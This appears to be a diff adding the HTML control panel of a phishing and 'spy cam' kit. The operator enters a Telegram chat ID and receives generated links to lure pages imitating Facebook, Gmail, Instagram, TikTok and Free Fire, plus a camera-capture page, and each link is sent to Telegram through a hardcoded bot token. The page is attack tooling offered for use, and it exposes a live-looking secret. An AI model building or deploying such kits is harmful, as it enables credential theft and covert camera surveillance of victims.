@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spy Cam Setup</title>
+    <style>
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes slideIn {
+            from { transform: translateY(-20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+
+        @keyframes move {
+            0% { transform: translateX(0); }
+            50% { transform: translateX(10px); }
+            100% { transform: translateX(0); }
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            background-color: #000;
+            color: #0f0;
+            margin: 0;
+            animation: fadeIn 1s ease-in-out;
+        }
+        .logo {
+            position: absolute;
+            top: 20px;
+            width: 100px;
+            height: auto;
+            animation: blink 1s infinite;
+            cursor: pointer;
+            -webkit-user-drag: none;
+            user-select: none;
+        }
+        h1 {
+            color: #0f0;
+            animation: slideIn 1s ease-in-out;
+        }
+        form {
+            background: #333;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+            width: 90%;
+            max-width: 400px;
+            animation: slideIn 1s ease-in-out, move 2s infinite;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #0f0;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #555;
+            border-radius: 4px;
+            background: #444;
+            color: #0f0;
+            transition: border-color 0.3s ease, background-color 0.3s ease;
+        }
+        input[type="text"]:focus {
+            border-color: #007BFF;
+            background-color: #555;
+            outline: none;
+        }
+        .buttons {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            justify-content: center;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #0f0;
+            color: #000;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            flex: 1 1 calc(50% - 20px);
+            min-width: 120px;
+        }
+        button:hover {
+            background-color: #00cc00;
+        }
+        .footer {
+            position: absolute;
+            bottom: 10px;
+            text-align: center;
+            width: 100%;
+            color: #777;
+        }
+        .blinking-light {
+            width: 5px;
+            height: 5px;
+            background-color: #0f0;
+            border-radius: 50%;
+            position: absolute;
+            animation: blink 1s infinite;
+        }
+        .blinking-light:nth-child(odd) {
+            animation-delay: 0.5s;
+        }
+    </style>
+</head>
+<body>
+    <div class="blinking-light" style="top: 10%; left: 10%;"></div>
+    <div class="blinking-light" style="top: 20%; left: 80%;"></div>
+    <div class="blinking-light" style="top: 50%; left: 50%;"></div>
+    <div class="blinking-light" style="top: 70%; left: 20%;"></div>
+    <div class="blinking-light" style="top: 80%; left: 70%;"></div>
+
+    <img src="Spycode.png" alt="Logo" class="logo" onclick="openLink()" oncontextmenu="return false;">
+    <h1>Spy Cam Setup</h1>
+    <form id="botForm">
+        <label for="chatId">Chat ID:</label>
+        <input type="text" id="chatId" name="chatId" required>
+        <br>
+        <div class="buttons">
+            <button type="button" onclick="generateLink('capture.html', 'Capture')">Capture</button>
+            <button type="button" onclick="generateLink('facebook.html', 'Facebook')">Facebook</button>
+            <button type="button" onclick="generateLink('freefier.html', 'Freefire')">Freefire</button>
+            <button type="button" onclick="generateLink('gmail.html', 'Gmail')">Gmail</button>
+            <button type="button" onclick="generateLink('instagram.html', 'Instagram')">Instagram</button>
+            <button type="button" onclick="generateLink('tiktok.html', 'TikTok')">TikTok</button>
+            <button type="button" onclick="openAboutMe()">About Me</button>
+        </div>
+    </form>
+    <p id="linkContainer"></p>
+    <div class="footer">
+        &copy; 2025 Spy Code. All rights reserved. | Subscribe for more updates.
+        &copy; <a href="https://www.youtube.com/@Spy_Code" target="_blank">https://www.youtube.com/@Spy_Code</a>
+    </div>
+
+    <script>
+        const botToken = '7347658420:AAFJel5v5zRqa-wF5IrK_lQoI1YPyHOZG0w';
+
+        function generateLink(page, name) {
+            const chatId = document.getElementById('chatId').value;
+            if (!chatId) {
+                alert('Please enter a Chat ID.');
+                return;
+            }
+            const baseUrl = window.location.href.substring(0, window.location.href.lastIndexOf('/')); // Get the current directory
+            const link = `${baseUrl}/${page}?chatId=${encodeURIComponent(chatId)}`;
+            document.getElementById('linkContainer').innerHTML = `Your ${name} link is: <a href="${link}" target="_blank">${link}</a>`;
+            sendLinkToTelegram(chatId, `Your ${name} link is: ${link}`);
+        }
+
+        async function sendLinkToTelegram(chatId, message) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+
+                if (response.ok) {
+                    console.log("Link sent to Telegram");
+                } else {
+                    console.error("Error sending link to Telegram: ", response.statusText);
+                }
+            } catch (error) {
+                console.error("Error sending link to Telegram: ", error);
+            }
+        }
+
+        function openLink() {
+            const link = "https://www.youtube.com/@Spy_Code";
+            window.open(link, "_blank");
+        }
+
+        function openAboutMe() {
+            const aboutMeUrl = "aboutme.html"; // Change this to the actual URL of your About Me page
+            window.open(aboutMeUrl, "_blank");
+        }
+    </script>
+</body>
+</html>
